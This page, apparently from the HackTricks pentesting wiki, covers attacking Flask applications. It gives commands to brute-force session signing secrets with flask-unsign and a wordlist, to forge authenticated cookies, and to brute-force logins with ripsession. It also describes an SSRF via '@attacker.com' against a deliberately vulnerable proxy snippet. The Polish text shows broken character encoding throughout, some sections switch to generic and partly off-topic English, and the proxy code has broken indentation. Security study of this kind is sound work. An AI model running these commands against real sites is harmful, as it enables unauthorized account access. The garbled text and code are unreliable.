# Flask

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**Prawdopodobnie, jeÅ›li grasz w CTF, aplikacja Flask bÄ™dzie zwiÄ…zana z** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**.**

## Ciasteczka (Cookies)

DomyÅ›lna nazwa sesji ciasteczka to **`session`**.

### Dekoder

Onlineowy dekoder ciasteczek Flask: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### RÄ™czny

Pobierz pierwszÄ… czÄ™Å›Ä‡ ciasteczka do pierwszej kropki i zdekoduj Base64>
```bash
echo "ImhlbGxvIg" | base64 -d
```
Ciasteczko jest rÃ³wnieÅ¼ podpisane za pomocÄ… hasÅ‚a

### **Flask-Unsign**

NarzÄ™dzie wiersza poleceÅ„ do pobierania, dekodowania, prÃ³b Å‚amania i tworzenia ciasteczek sesji aplikacji Flask przez zgadywanie kluczy tajnych.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Dekodowanie ciasteczka**

To decode a Flask cookie, you can use the `itsdangerous` library, which is included in Flask. The `itsdangerous` library provides a `URLSafeTimedSerializer` class that can be used to decode and verify the integrity of the cookie.

```python
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    try:
        decoded_data = serializer.loads(cookie_value)
        return decoded_data
    except Exception as e:
        return None
```

In the code above, the `decode_cookie` function takes two parameters: `cookie_value` and `secret_key`. The `cookie_value` parameter is the value of the cookie that you want to decode, and the `secret_key` parameter is the secret key used to sign the cookie.

The function creates an instance of the `URLSafeTimedSerializer` class with the provided `secret_key`. It then attempts to decode the `cookie_value` using the `loads` method of the serializer. If the decoding is successful, the decoded data is returned. If an exception occurs during the decoding process, `None` is returned.

Keep in mind that decoding a cookie does not necessarily mean that you can modify its contents. The `itsdangerous` library also verifies the integrity of the cookie, so if the cookie has been tampered with, the decoding process will fail.
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Atak Brute Force**

Brute Force to technika polegajÄ…ca na prÃ³bie odgadniÄ™cia hasÅ‚a lub klucza, poprzez wyprÃ³bowanie wszystkich moÅ¼liwych kombinacji. W przypadku aplikacji Flask, atak Brute Force moÅ¼e byÄ‡ stosowany do prÃ³by odgadniÄ™cia hasÅ‚a administratora lub innych poufnych informacji. Aby przeprowadziÄ‡ atak Brute Force na aplikacjÄ™ Flask, moÅ¼na uÅ¼yÄ‡ narzÄ™dzi takich jak Hydra lub Burp Suite.
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **Podpisywanie**

Flask provides a built-in mechanism for signing data to ensure its integrity and authenticity. This can be useful in scenarios where you want to verify that the data has not been tampered with.

Flask uses a secret key to sign the data. This secret key should be kept secure and should not be shared with anyone. It is recommended to store the secret key in an environment variable or a configuration file.

To sign data in Flask, you can use the `itsdangerous` module, which is included with Flask. This module provides the `URLSafeSerializer` class, which can be used to sign and verify data.

Here is an example of how to sign data using Flask:

```python
from flask import Flask
from itsdangerous import URLSafeSerializer

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'

@app.route('/')
def index():
    s = URLSafeSerializer(app.config['SECRET_KEY'])
    data = {'username': 'john', 'admin': False}
    signed_data = s.dumps(data)
    return signed_data

if __name__ == '__main__':
    app.run()
```

In this example, we create an instance of the `URLSafeSerializer` class with the secret key from the Flask app's configuration. We then use the `dumps()` method to sign the data and return the signed data.

To verify the signed data, you can use the `loads()` method of the `URLSafeSerializer` class. Here is an example:

```python
from flask import Flask
from itsdangerous import URLSafeSerializer, BadSignature

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'

@app.route('/')
def index():
    s = URLSafeSerializer(app.config['SECRET_KEY'])
    signed_data = 'eyJ1c2VybmFtZSI6ICJqb2huIiwgImFkbWluIjogRmFsc2V9.XXX'
    try:
        data = s.loads(signed_data)
        return str(data)
    except BadSignature:
        return 'Invalid signature'

if __name__ == '__main__':
    app.run()
```

In this example, we use the `loads()` method to verify the signed data. If the signature is valid, the original data is returned. If the signature is invalid, a `BadSignature` exception is raised.

By using the signing mechanism provided by Flask, you can ensure the integrity and authenticity of your data, helping to prevent tampering and unauthorized access.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### Podpisywanie za pomocÄ… starszych wersji

To jest metoda podpisywania, ktÃ³ra jest stosowana w starszych wersjach.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

NarzÄ™dzie wiersza poleceÅ„ do brute-force'owania stron internetowych przy uÅ¼yciu ciasteczek stworzonych za pomocÄ… flask-unsign.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi w ciasteczku sesji Flask z uÅ¼yciem SQLmap

[**Ten przykÅ‚ad**](../../pentesting-web/sql-injection/sqlmap/#eval) wykorzystuje opcjÄ™ `eval` w sqlmap do **automatycznego podpisywania Å‚adunkÃ³w sqlmap** dla Flaska przy uÅ¼yciu znanego sekretu.

## Proxy Flask do SSRF

[**W tym artykule**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) wyjaÅ›nione jest, jak Flask pozwala na Å¼Ä…danie rozpoczynajÄ…ce siÄ™ od znaku "@":
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
W przypadku nastÄ™pujÄ…cego scenariusza:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
MoÅ¼na pozwoliÄ‡ na wprowadzenie czegoÅ› takiego jak "@attacker.com", aby spowodowaÄ‡ **SSRF**.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
